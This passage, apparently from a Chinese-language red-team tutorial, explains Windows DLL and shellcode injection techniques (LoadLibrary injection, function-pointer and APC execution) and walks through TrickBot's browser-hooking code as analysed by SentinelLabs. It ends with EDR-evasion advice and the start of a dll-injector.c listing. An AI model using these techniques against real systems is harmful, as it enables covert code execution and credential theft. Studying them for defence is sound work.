+<p>在DLL注入技术中，有两种主要的方式来将DLL加载到目标进程中：</p>
+<ol>
+<li>
+<p><strong>外部注入（External Injection）：</strong></p>
+<ul>
+<li>外部注入是通过&nbsp;<code>LoadLibrary</code>&nbsp;函数，通过指定 DLL 的路径来实现的。</li>
+<li>这种方式不直接将 DLL 的二进制内容写入到目标进程，而是由&nbsp;<code>LoadLibrary</code>&nbsp;函数在运行时动态地加载 DLL 的二进制内容。</li>
+<li>外部注入的过程中，我们通过&nbsp;<code>WriteProcessMemory</code>&nbsp;写入的是 DLL 的路径，而不是 DLL 的实际内容。</li>
+</ul>
+</li>
+<li>
+<p><strong>内部注入（Internal Injection）：</strong></p>
+<ul>
+<li>内部注入是通过直接将 DLL 的二进制内容写入到目标进程的虚拟空间中来实现的。</li>
+<li>这种方式通常需要手动解析 DLL 的 PE 头，将各个段（例如代码段、数据段）逐一写入到目标进程。</li>
+<li>内部注入不依赖于&nbsp;<code>LoadLibrary</code>，而是手动处理 DLL 的加载过程。</li>
+</ul>
+</li>
+</ol>
+<p><strong>区别：</strong></p>
+<ul>
+<li>
+<p><strong>外部注入（<code>LoadLibrary</code>）：</strong></p>
+<ul>
+<li>通过指定 DLL 路径进行加载。</li>
+<li>系统负责在&nbsp;<code>LoadLibrary</code>&nbsp;函数运行时动态地将 DLL 的内容映射到目标进程中。</li>
+<li>数据注入过程主要是写入 DLL 的路径。</li>
+</ul>
+</li>
+<li>
+<p><strong>内部注入：</strong></p>
+<ul>
+<li>通过直接将 DLL 的二进制内容写入目标进程来完成注入。</li>
+<li>需要手动处理 DLL 的加载过程，包括解析 PE 头，逐段写入等。</li>
+<li>不依赖于&nbsp;<code>LoadLibrary</code>&nbsp;函数。</li>
+</ul>
+</li>
+</ul>
+<p>总体而言，外部注入相对较简单，因为它依赖于系统的动态加载机制，而内部注入则需要更多手动的处理。选择哪种方式通常取决于具体的应用场景和需求。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605531.png" alt></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605532.png" alt></p>
+<h1 id="0x06-关于内存执行的其他方案">0x06 关于内存执行的其他方案</h1>
+<p>根据我们所处的环境，我们可以需要适当地更改执行shellcode的方式，当我们面临 API 调用上有钩子并且我们无法规避或取消钩子、EDR正在监视线程等情况时，就可能需要重新考虑关于内存(shellcode)执行的方案。</p>
+<p>tips：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/564398361">EDR-Endpoint Detection and Response，端点检测与响应</a>。</p>
+<p>到目前为止，我们主要研究了在本地/远程进程中分配空间以及向其中写入数据的方法，但是在进程注入技术中内存(shellcode)执行也是至关重要的一步，尽管这一步在尝试最大程度地减少内存痕迹和IOC(危害指标)时并不那么重要。与分配空间和写入数据不同，关于内存(shellcode)执行有很多选项可供我们选择。</p>
+<p>在本文内容中，我们主要通过<code>CreateThread</code>和<code>CreateRemoteThread</code>来观察内存(shellcode)执行的情况。</p>
+<p>在本小节中，我们将根据具体的环境情况介绍三种可供使用的另外三种内存(shellcode)执行方法。</p>
+<h2 id="调用函数指针">调用函数指针</h2>
+<p>void函数指针是一种奇特的新颖的内存块执行方法(仅依赖于强制类型转换)，该技术只能使用本地分配的内存来完成shellcode执行，并且不依赖于任何API调用或其他系统功能。</p>
+<p>下面的一行代码是void函数指针最常见的形式，我们将进一步分解它来解释它的组成部分。</p>
+<pre><code class="hljs c++"><span class="hljs-comment">//Function Pointer 函数指针</span>
+((<span class="hljs-built_in">void</span>(*)())addressPointer)();</code></pre>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605533.png" alt></p>
+<p>上述这个单行代码可能很难理解或解释，因为它非常密集，让我们浏览一下它处理指针的过程：</p>
+<ol>
+<li>创建一个函数指针<code>(void(*)()</code>，即上图中的红色标记部分；</li>
+<li>将已分配的内存指针或shellcode数组强制转换类型为函数指针<code>(&lt;function pointer&gt;)addressPointer)</code>，即上图中的黄色标记部分；</li>
+<li>调用函数指针来执行shellcode&nbsp;<code>();</code>，即上图中的绿色标记部分。</li>
+</ol>
+<p>这种技术的实际用例比较特殊，但是有时候也可能非常有用。</p>
+<h2 id="异步过程调用">异步过程调用</h2>
+<p>根据<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">微软的相关文档</a>所述：“异步过程调用(APC-Asynchronous Procedure Call)是指在特定线程的上下文中异步执行的函数。”</p>
+<p>APC函数通过<code>QueueUserAPC</code>在线程中排队，一旦APC函数进入线程队列，就将导致软件中断，并会在下次调用线程时执行该函数。</p>
+<p>为了让用户态/用户模式应用程序对APC函数进行排队，线程必须处于可警报状态；可警报状态将要求线程等待回调，例如&nbsp;<code>WaitForSingleObject</code>或<code>Sleep</code>。</p>
+<p>现在我们了解了APC函数是什么，让我们来看看它们是如何被恶意使用的，此外，在代码中我们将使用<code>VirtualAllocEx</code>和<code>WriteProcessMemory</code>来分配和写入内存。</p>
+<pre><code class="hljs c++"><span class="hljs-built_in">QueueUserAPC</span>(
+	(PAPCFUNC)addressPointer, <span class="hljs-comment">// APC function pointer to allocated memory defined by winnt 指向由winnt定义的已分配内存的APC函数指针</span>
+	pinfo.hThread, <span class="hljs-comment">//PROCESS_INFORMATION结构中的线程句柄</span>
+	(ULONG_PTR)<span class="hljs-literal">NULL</span>
+	);
+<span class="hljs-built_in">ResumeThread</span>( <span class="hljs-comment">//恢复被挂起的线程</span>
+	pinfo.hThread <span class="hljs-comment">//PROCESS_INFORMATION结构中的线程句柄</span>
+);
+<span class="hljs-built_in">WaitForSingleObject</span>(
+	pinfo.hThread, <span class="hljs-comment">//PROCESS_INFORMATION结构中的线程句柄</span>
+	INFINITE <span class="hljs-comment">// Wait infinitely until alerted 无限等待直到收到警报</span>
+);</code></pre>
+<p>该技术是线程执行的一个很好的替代方案，但它可能会被网络安全检测工程所检测到，并且蓝队可以针对APC滥用部署特定蜜罐。 根据我们所面临的网络安全检测措施的不同，异步过程调用技术可能仍然会是一个不错的选择。</p>
+<h2 id="section-manipulationpe节处理">Section Manipulation(PE节处理)</h2>
+<p>恶意软件研究中常见的技术是PE(Portable Executable)和PE节处理。</p>
+<p>PE格式定义了Windows中可执行文件的结构和格式，出于执行的目的，我们将主要关注PE节(特别是.data和.text)，此外，节表和指向PE节的指针也常被用于执行数据。</p>
+<p>在此我们不会深入研究这些PE处理技术，因为它们很复杂并且需要进行大量的技术分解，但是我们将讨论它们的基本原理。</p>
+<p>为了开始使用任何PE节处理技术，我们需要先获取PE转储，而获取PE转储通常是通过将恶意DLL或其他恶意文件提供给专门的反汇编和分析工具（例如 IDA Pro、OllyDbg、Ghidra 等）来完成的。</p>
+<p>每种PE节处理方法的核心都是使用数学运算来操作物理的十六进制数据，这些数据随后将被转换为PE数据。</p>
+<p>一些较为常见的PE节处理技术包括RVA入口点解析、节映射和重定位表解析等。</p>
+<p>注意：对于所有的进程注入技术，我们都可以通过混合和匹配常用的研究方法来进行改进，这将为攻击者提供大量操作和执行恶意数据的选项。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605534.png" alt></p>
+<h1 id="0x07-浏览器注入和钩子hooking的案例研究">0x07 浏览器注入和钩子(Hooking)的案例研究</h1>
+<p>为了更好地了解进程注入的含义，我们可以观察TrickBot(一种恶意软件)的 TTP(Tactics, Techniques, and Procedures-策略、技术和程序)。</p>
+<p>初步研究成果：<a target="_blank" rel="noopener" href="https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/"><em>SentinelLabs</em></a></p>
+<p>TrickBot是一种针对银行的知名恶意软件，最近在金融犯罪软件中重新流行起来，在本小节中我们将观察该恶意软件的主要功能——浏览器钩子，浏览器钩子允许恶意软件挂钩有趣的 API 调用，而这些调用可被用于拦截/窃取凭据。</p>
+<p>在开始我们的分析之前，让我们看看TrickBot是如何以浏览器为目标的，从SentinelLab的逆向工程中可以明显看出：&nbsp;<code>OpenProcess</code>&nbsp;将被用来获取常见浏览器路径的句柄。以下是相关的反汇编结果：</p>
+<pre><code class="hljs c">push   eax
+push   <span class="hljs-number">0</span>
+push   <span class="hljs-number">438</span>h
+call   ds:OpenProcess
+mov    edi, eax
+mov    [edp,hProcess], edi
+test   edi, edi
+jz     loc_100045EE
+push   offset Srch            ; <span class="hljs-string">"chrome.exe"</span>
+lea    eax, [ebp+pe.szExeFile]
+...
+mov    eax, ecx
+push   offset aIexplore_exe   ; <span class="hljs-string">"iexplore.exe"</span>
+push   eax                    ; lpFirst
+...
+mov    eax, ecx
+push   offset aFirefox_exe   ; <span class="hljs-string">"firefox.exe"</span>
+push   eax                    ; lpFirst
+...
+mov    eax, ecx
+push   offset aMicrosoftedgec   ; <span class="hljs-string">"microsoftedgecp.exe"</span>
+...</code></pre>
+<p>SentinelLabs将相关注入的基本程序流程概述如下：</p>
+<ol>
+<li>打开目标进程，<code>OpenProcess</code>；</li>
+<li>分配内存，<code>VirtualAllocEx</code>；</li>
+<li>将函数复制到已分配的内存中，<code>WriteProcessMemory</code>；</li>
+<li>将shellcode复制到已分配的内存中，<code>WriteProcessMemory</code>；</li>
+<li>刷新缓存以提交更改，<code>FlushInstructionCache</code>；</li>
+<li>创建一个远程线程，<code>RemoteThread</code>；</li>
+<li>恢复线程或回退以创建新的用户线程，<code>ResumeThread</code>或者<code>RtlCreateUserThread</code>。</li>
+</ol>
+<p>tips：<code>FlushInstructionCache</code>&nbsp;是一个函数，通常用于刷新处理器的指令缓存，在涉及动态生成和执行代码的情况下，特别是在一些系统编程或底层编程的场景中，这个函数会变得很有用。</p>
+<p>完成注入后，TrickBot(一种恶意软件)将调用在上述第三步中复制到已分配的内存中的钩子安装函数，下面是SentinelLabs提供的关于安装函数的伪代码。</p>
+<pre><code class="hljs c++">relative_offset = myHook_function - *(_DWORD *)(original_function + <span class="hljs-number">1</span>) - <span class="hljs-number">5</span>;
+v8 = (<span class="hljs-type">unsigned</span> __int8)original_function[<span class="hljs-number">5</span>];
+trampoline_lpvoid = *(<span class="hljs-type">void</span> **)(original_function + <span class="hljs-number">1</span>);
+jmp_32_bit_relative_offset_opcode = <span class="hljs-number">0xE9</span>u;		<span class="hljs-comment">// "0xE9" -&gt; 具有32位相对偏移量的跳转操作码</span>
+
+<span class="hljs-keyword">if</span> ( <span class="hljs-built_in">VirtualProtectEx</span>((HANDLE)<span class="hljs-number">0xFFFFFFFF</span>, trampoline_lpvoid, v8, <span class="hljs-number">0x40</span>u, &amp;flOldProtect) ) <span class="hljs-comment">//使用`VirtualProtectEx`函数将指定内存区域的保护属性设置为`PAGE_EXECUTE_READWRITE`</span>
+{
+	v10 = *(_DWORD *)(original_function + <span class="hljs-number">1</span>);
+	v11 = (<span class="hljs-type">unsigned</span> __int8)original_function[<span class="hljs-number">5</span>] - (_DWORD)original_function - <span class="hljs-number">0x47</span>;
+	original_function[<span class="hljs-number">66</span>] = <span class="hljs-number">0xE9</span>u;
+	*(_DWORD *)(original_function + <span class="hljs-number">0x43</span>) = v10 + v11;
+	<span class="hljs-built_in">write_hook_iter</span>(v10, &amp;jmp_32_bit_relative_offset_opcode, <span class="hljs-number">5</span>); <span class="hljs-comment">// -&gt; Manually write the hook 手动编写钩子</span>
+	<span class="hljs-built_in">VirtualProtectEx</span>(		<span class="hljs-comment">// 返回到原来的保护状态</span>
+		(HANDLE)<span class="hljs-number">0xFFFFFFFF</span>,
+		*(LPVOID *)(original_function + <span class="hljs-number">1</span>),
+		(<span class="hljs-type">unsigned</span> __int8)original_function[<span class="hljs-number">5</span>],
+		flOldProtect,
+		&amp;flOldProtect);
+result = <span class="hljs-number">1</span>;
+}
+    
+<span class="hljs-comment">//这段伪代码涉及到函数的 Hooking（挂钩）实现，主要目的是创建一个跳板（trampoline），使得在执行原始函数时能够在适当的时机跳转到钩子函数，然后等钩子函数执行完之后再返回到原始函数的执行流程。</span>
+
+<span class="hljs-comment">//以下是对代码段的逐步分析：</span>
+
+<span class="hljs-comment">//1. `relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;`:</span>
+<span class="hljs-comment">//   - 计算相对偏移量。`myHook_function`表示用于替代原始函数的钩子函数，`original_function`则是原始函数的地址。</span>
+<span class="hljs-comment">//   - 从`original_function + 1`处读取4字节数据（一个DWORD），然后使用`myHook_function`减去这个DWORD，再减去5，就得到相对偏移量。</span>
+
+<span class="hljs-comment">//2. `v8 = (unsigned __int8)original_function[5];`:</span>
+<span class="hljs-comment">//   - 从`original_function`地址加5的位置，读取一个字节的数据并存储在`v8`中；该字节(original_function[5])通常会包含一些与函数执行相关的信息。</span>
+
+<span class="hljs-comment">//3. `trampoline_lpvoid = *(void **)(original_function + 1);`:</span>
+<span class="hljs-comment">//   - 从`original_function`地址加1的位置，读取一个指针大小的数据并存储在`trampoline_lpvoid`中；该指针通常会指向一个跳板（trampoline）。</span>
+
+<span class="hljs-comment">//4. `jmp_32_bit_relative_offset_opcode = 0xE9u;`:</span>
+<span class="hljs-comment">//   - 设置一个具有32位相对偏移量的跳转指令的操作码（opcode）——`0xE9u`，这是x86汇编中的相对跳转指令。</span>
+
+<span class="hljs-comment">//5. `VirtualProtectEx(...)`:</span>
+<span class="hljs-comment">//  - 使用`VirtualProtectEx`函数将指定内存区域的保护属性设置为`PAGE_EXECUTE_READWRITE`。</span>
+
+<span class="hljs-comment">//6. `v10 = *(_DWORD *)(original_function + 1);`:</span>
+<span class="hljs-comment">//   - 从 `original_function + 1` 处读取 4 字节数据并存储在 `v10` 中。</span>
+
+<span class="hljs-comment">//7. `v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;`:</span>
+<span class="hljs-comment">//   - 计算一个相对偏移量，将原始函数的字节（`original_function[5]`）与其他偏移值相减。</span>
+
+<span class="hljs-comment">//8. `original_function[66] = 0xE9u;`:</span>
+<span class="hljs-comment">//   - 将 `original_function` 地址偏移 66 处的字节数据设置为相对跳转指令的操作码。</span>
+
+<span class="hljs-comment">//9. `*(_DWORD *)(original_function + 0x43) = v10 + v11;`:</span>
+<span class="hljs-comment">//   - 将 `original_function` 地址偏移 0x43 处的 4 字节数据设置为通过计算得到的相对偏移量。</span>
+
+<span class="hljs-comment">//10. `write_hook_iter(v10, &amp;jmp_32_bit_relative_offset_opcode, 5);`:</span>
+<span class="hljs-comment">//   - 调用 `write_hook_iter` 函数，该函数的作用是在 `v10` 处写入 5 个字节(0xE9u)，用于执行跳转。</span>
+
+<span class="hljs-comment">//11. `VirtualProtectEx(...)`:</span>
+<span class="hljs-comment">//   - 使用 `VirtualProtectEx` 函数将指定内存区域的保护属性设置回原始状态。</span>
+
+<span class="hljs-comment">//12. `result = 1;`:</span>
+<span class="hljs-comment">//   - 设置结果标志为 1，成功返回 1 则表示 Hook 操作成功。</span>
+
+<span class="hljs-comment">//这段代码实现了一个函数的Hooking，该代码通过创建一个跳板来实现对原始函数的替换和调用，值得注意的是这种底层的内存操作可能会涉及系统编程和一些特定场景，需要谨慎使用。</span>
+
+<span class="hljs-comment">//关于跳板函数(trampoline)：</span>
+<span class="hljs-comment">//让我们逐步解释一下与上述代码相关的挂钩过程：</span>
+
+<span class="hljs-comment">//挂钩前状态： 原始函数有一段字节码，其中包含一个跳转指令，通常用于跳转到函数的实际实现，我们可以修改这个跳转指令，以便将控制流引导到钩子函数而非原始函数。</span>
+
+<span class="hljs-comment">//挂钩后状态： 在挂钩的过程中，原始函数的跳转指令将被修改，以便使其指向钩子函数；这就是为什么需要一个跳板函数的原因，跳板函数保存了被修改的字节，以便在钩子函数执行完成后能够将这些字节还原，从而正确返回到原始函数的执行流程。</span>
+
+<span class="hljs-comment">//钩子函数执行： 当程序执行到被挂钩的函数时，实际上会跳转到钩子函数，而钩子函数执行完自己的逻辑后，需要将控制流程正确地还原到原始函数，以保持程序的正常执行。</span>
+
+<span class="hljs-comment">//跳板函数的作用： 跳板函数的目的就是在钩子函数执行完成后，将原始函数的字节还原回被修改前的状态，以确保控制流程能够正确返回到原始函数；这就是为什么需要保存原始函数的部分字节，并在跳板函数中执行还原操作的原因。</span>
+
+<span class="hljs-comment">//总的来说，跳板函数在挂钩过程中充当了一个中间层，保存了原始函数的状态，以确保在钩子函数执行完后，能够正确地返回到原始函数的执行流程，维护程序的正常执行。</span>
+
+<span class="hljs-comment">//注意：在本小节所提供的伪代码段中并未直接给出跳板函数所执行的具体还原操作。</span></code></pre>
+<p>接下来让我们尝试分解上面这段代码。</p>
+<p>我们所看到的第一部分代码段可以被确认为是在定义函数指针，我们可以从上文关于调用函数指针的介绍中回忆起这一点。</p>
+<pre><code class="hljs c++">relative_offset = myHook_function - *(_DWORD *)(original_function + <span class="hljs-number">1</span>) - <span class="hljs-number">5</span>;
+v8 = (<span class="hljs-type">unsigned</span> __int8)original_function[<span class="hljs-number">5</span>];
+trampoline_lpvoid = *(<span class="hljs-type">void</span> **)(original_function + <span class="hljs-number">1</span>);
+
+
+<span class="hljs-comment">//这段伪代码涉及到对函数的跳板（trampoline）的创建，通常用于函数挂钩（hooking）的场景，下面是对这部分代码的解析：</span>
+
+<span class="hljs-comment">//1. `relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;`:</span>
+<span class="hljs-comment">//   - 计算相对偏移量。`myHook_function` 表示用于替代原始函数的钩子函数，`original_function`则是原始函数的地址。</span>
+<span class="hljs-comment">//   - `original_function + 1` 将得到原始函数的地址偏移 1 字节的位置，`*(_DWORD *)`将获取该地址处的 4 字节数据（一个 DWORD）。</span>
+<span class="hljs-comment">//   - 然后使用`myHook_function`减去这个 DWORD，再减去 5，就能得到相对偏移量。</span>
+
+<span class="hljs-comment">//2. `v8 = (unsigned __int8)original_function[5];`:</span>
+<span class="hljs-comment">//   - 从原始函数的地址加5的位置，读取一个字节的数据并存储在 `v8` 中；这个字节通常会包含一些与函数执行相关的信息，例如操作码或其他标志。</span>
+
+<span class="hljs-comment">//3. `trampoline_lpvoid = *(void **)(original_function + 1);`:</span>
+<span class="hljs-comment">//   - 从原始函数的地址加1处，读取一个指针大小的数据，存储在 `trampoline_lpvoid` 中；这个指针通常将指向一个函数的跳板（trampoline），用于保存原始函数的部分字节，以便在钩子函数执行完后能够正确跳回到原始函数的执行流程。</span>
+
+<span class="hljs-comment">//这段伪代码的目的是创建一个跳板，将 `myHook_function` 与原始函数关联起来，使得在执行原始函数时，能够在适当的时机跳转执行 `myHook_function`。</span></code></pre>
+<p>一旦定义了函数指针，恶意软件就会使用它们来通过<code>VirtualProtectEx</code>修改函数的内存保护。</p>
+<pre><code class="hljs c++"><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">VirtualProtectEx</span>((HANDLE)<span class="hljs-number">0xFFFFFFFF</span>, trampoline_lpvoid, v8, <span class="hljs-number">0x40</span>u, &amp;flOldProtect) )
+    
+<span class="hljs-comment">//这段代码调用了 `VirtualProtectEx` 函数，想要更改内存保护属性，让我们逐步分析它：</span>
+
+<span class="hljs-comment">//1. `VirtualProtectEx` 是一个 Windows API 函数，用于修改进程的虚拟内存保护属性。</span>
+
+<span class="hljs-comment">//2. `(HANDLE)0xFFFFFFFF` 是一个特殊的句柄值，表示对所有进程都有效的特殊标识符；它相当于 `HANDLE hProcess` 参数，指定了要修改保护属性的进程的句柄。</span>
+
+<span class="hljs-comment">//3. `trampoline_lpvoid` 是一个指针，指向要修改保护属性的内存区域的起始地址。</span>
+
+<span class="hljs-comment">//4. `v8` 是一个字节大小的变量，用于指定要修改的内存区域的大小。</span>
+
+<span class="hljs-comment">//5. `0x40u` 是新的保护属性。在这里，`0x40` 对应于 `PAGE_EXECUTE_READWRITE`，表示允许执行、读取和写入。</span>
+
+<span class="hljs-comment">//6. `&amp;flOldProtect` 是一个指向 `DWORD` 变量的指针，用于存储原始的保护属性。</span>
+
+<span class="hljs-comment">//7. 整个语句使用 `if` 进行条件判断，如果 `VirtualProtectEx` 调用成功，则条件为真，将继续执行后继的 `if` 块内的代码。</span>
+
+<span class="hljs-comment">//总的来说，这段代码想要修改指定内存区域的保护属性，使其可执行、可读、可写，这种操作通常在进行底层编程、代码注入或 Hooking 等场景中使用，需要注意的是，这种操作可能涉及到系统级别的权限和风险，应谨慎使用。</span></code></pre>
+<p>此时，代码就变成了带有函数指针钩子的恶意软件，从本质上讲，此代码部分将重写一个钩子并使其指向操作码跳转。</p>
+<pre><code class="hljs c++">v10 = *(_DWORD *)(original_function + <span class="hljs-number">1</span>);
+v11 = (<span class="hljs-type">unsigned</span> __int8)original_function[<span class="hljs-number">5</span>] - (_DWORD)original_function - <span class="hljs-number">0x47</span>;
+original_function[<span class="hljs-number">66</span>] = <span class="hljs-number">0xE9</span>u;
+*(_DWORD *)(original_function + <span class="hljs-number">0x43</span>) = v10 + v11;
+<span class="hljs-built_in">write_hook_iter</span>(v10, &amp;jmp_32_bit_relative_offset_opcode, <span class="hljs-number">5</span>); <span class="hljs-comment">// -&gt; Manually write the hook 手动编写钩子</span>
+
+<span class="hljs-comment">///这段代码的目标是修改原始函数的一部分代码，使其在被调用时跳转到钩子函数，让我们逐行分析这段代码：</span>
+
+<span class="hljs-comment">//1. `v10 = *(_DWORD *)(original_function + 1);`:</span>
+<span class="hljs-comment">//   - 从 `original_function` 地址加 1 处读取 4 字节数据，并存储在 `v10` 中，这通常是函数的一部分指令或数据。</span>
+
+<span class="hljs-comment">//2. `v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;`:</span>
+<span class="hljs-comment">//   - 从 `original_function` 地址加 5 处读取一个字节的数据，将其转换为 `unsigned __int8` 类型，然后减去 `(_DWORD)original_function` 和 `0x47`；这是在计算一个相对偏移量。</span>
+
+<span class="hljs-comment">//3. `original_function[66] = 0xE9u;`:</span>
+<span class="hljs-comment">//   - 将 `original_function` 地址偏移 66 处的字节(即第67个字节)设置为 `0xE9`，这是 x86 汇编指令集中的相对跳转指令的操作码。</span>
+
+<span class="hljs-comment">//4. `*(_DWORD *)(original_function + 0x43) = v10 + v11;`:</span>
+<span class="hljs-comment">//   - 将 `original_function` 地址偏移 0x43 处的 4 字节数据设置为 v10 + v11 的值，这可能是在设置跳转指令的目标地址。</span>
+<span class="hljs-comment">//将一个 32 位整数的值（v10 + v11）写入到原始函数 original_function 中偏移 0x43 处的位置，这种操作通常用于在 Hook 操作中修改原始函数的一部分字节，以实现对函数行为的修改。</span>
+
+<span class="hljs-comment">//5. `write_hook_iter(v10, &amp;jmp_32_bit_relative_offset_opcode, 5);`:</span>
+<span class="hljs-comment">//   - 调用 `write_hook_iter` 函数，该函数的作用是在 `v10` 处写入 5 个字节(0xE9u)，用于执行相对跳转指令，这通常是用于手动编写钩子，即更改函数的执行路径。</span>
+
+<span class="hljs-comment">//这段代码的目的是创建一个相对跳转的钩子（hook），通过修改原始函数的字节，将其替换为一个跳转指令，使得在执行原始函数时会跳转到指定的地址；这样的操作通常用于实现函数钩子，允许在函数执行时插入自定义的代码。</span>
+<span class="hljs-comment">//通过这种方式，当原始函数被调用时，它会在执行到第67个字节的跳转指令时，跳转到钩子函数执行，这就实现了对原始函数的拦截和修改。</span></code></pre>
+<p>代码段还使用了&nbsp;<code>VirtualProtectEx</code>&nbsp;函数将指定内存区域的保护属性设置回原始状态，这样一旦完成挂钩(hooked)，就可以将函数返回到原来的内存保护状态。</p>
+<pre><code class="hljs c++"><span class="hljs-built_in">VirtualProtectEx</span>(		<span class="hljs-comment">// Return to original protect state 返回到原来的保护状态</span>
+		(HANDLE)<span class="hljs-number">0xFFFFFFFF</span>,
+		*(LPVOID *)(original_function + <span class="hljs-number">1</span>),
+		(<span class="hljs-type">unsigned</span> __int8)original_function[<span class="hljs-number">5</span>],
+		flOldProtect,
+		&amp;flOldProtect);
+
+<span class="hljs-comment">//这段代码使用了`VirtualProtectEx` 函数将指定内存区域的保护属性还原到之前所保存的原始状态，让我们逐步分析一下这段代码：</span>
+
+<span class="hljs-comment">//1. `(HANDLE)0xFFFFFFFF`：</span>
+<span class="hljs-comment">//   - 传递一个特殊的句柄值，`0xFFFFFFFF` 在 Windows 中通常表示无效句柄或者对所有进程都有效的特殊标识符。</span>
+
+<span class="hljs-comment">//2. `*(LPVOID *)(original_function + 1)`：</span>
+<span class="hljs-comment">//   - 从 `original_function + 1` 处读取一个指针大小的数据，这通常是指向之前所保存的跳板的指针；这个指针指向一个内存区域，其中包含了原始函数的一部分字节和一些 Hook 相关的操作。</span>
+
+<span class="hljs-comment">//3. `(unsigned __int8)original_function[5]`：</span>
+<span class="hljs-comment">//   - 从 `original_function` 地址加 5 处读取一个字节的数据；这个字节通常包含了原始函数的一些信息，可能与其执行方式有关。</span>
+
+<span class="hljs-comment">//4. `flOldProtect`：</span>
+<span class="hljs-comment">//   - 这是一个先前保存的 DWORD 变量，用于存储执行Hook操作之前的原始内存保护属性。</span>
+
+<span class="hljs-comment">//5. `&amp;flOldProtect`：</span>
+<span class="hljs-comment">//   - 一个指向 DWORD 变量的指针，即flOldProtect的地址，用于指向此VirtualProtectEx函数执行后的内存保护属性。</span>
+
+<span class="hljs-comment">//总体而言，这段代码的作用是调用 `VirtualProtectEx` 函数，将之前通过 Hook 操作修改的内存区域的保护属性还原到原来的状态，这通常是为了保证在 Hook 操作期间对内存的修改不会对程序的正常执行产生不良影响，这种操作常见于实现 Hooking 时的最后步骤。</span></code></pre>
+<p>对于TrickBot来说，它的钩子函数的主要特点是会通过反射注入将自身注入到浏览器进程中，并且会从已注入的函数中挂钩(hook)API调用。</p>
+<p>tips：“Hook” 在计算机领域可以同时作为名词和动词使用。作为名词时，“hook” 可以表示一种机制或函数，用于截取、拦截或改变特定操作、事件的处理方式，例如，“function hook” 意味着截取某个函数的执行，使其执行一个定制的操作；作为动词时，“hook” 表示应用或实施hook机制，例如，“to hook a function” 意味着对某个函数进行拦截或改变其执行方式。总之，“hook” 可以灵活地用作名词或动词，需要根据上下文语境才能确定其具体含义。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605535.png" alt></p>
+<h1 id="0x08-总结">0x08 总结</h1>
+<p>进程注入是一种总体性的技术，可以在许多不同情境中被使用，进程注入也是滥用Windows内部机制的最常见情况之一。</p>
+<p>需要注意的是，随着网络安全检测工程与监控技术的发展，进程注入技术也需要不断发展，本文所介绍的大多数技术都会被流行的商业EDRs(终端检测与响应工具)检测到，但是我们仍然可以尝试修改我们的注入器以便满足红队行动的操作需求。</p>
+<p>当我们准备将这些进程注入技术合并到属于自己的工作或工具中时，建议仅将这些注入技术用作组成一个更大的工具的一小部分，同时，通过混合和匹配用于进程注入的组件还可以有效地让我们的攻击工具尽可能接近合法的应用程序。</p>
+<p>与本文实验环境所提供的注入器相关的部分代码资源如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605536.png" alt></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605537.png" alt></p>
+<p>dll-injector.c代码：</p>
+<pre><code class="hljs c"><span class="hljs-comment">//dll-injector.c</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span>
+
+DWORD <span class="hljs-title function_">getProcessId</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *processName)</span> {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);
+    <span class="hljs-keyword">if</span> (hSnapshot) {
+        PROCESSENTRY32 entry;
+        entry.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);
+        <span class="hljs-keyword">if</span> (Process32First(hSnapshot, &amp;entry)) {
+            <span class="hljs-keyword">do</span> {
+                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(entry.szExeFile, processName)) {
+                    <span class="hljs-keyword">return</span> entry.th32ProcessID;
+                }
+            } <span class="hljs-keyword">while</span> (Process32Next(hSnapshot, &amp;entry));
+        }
+    }
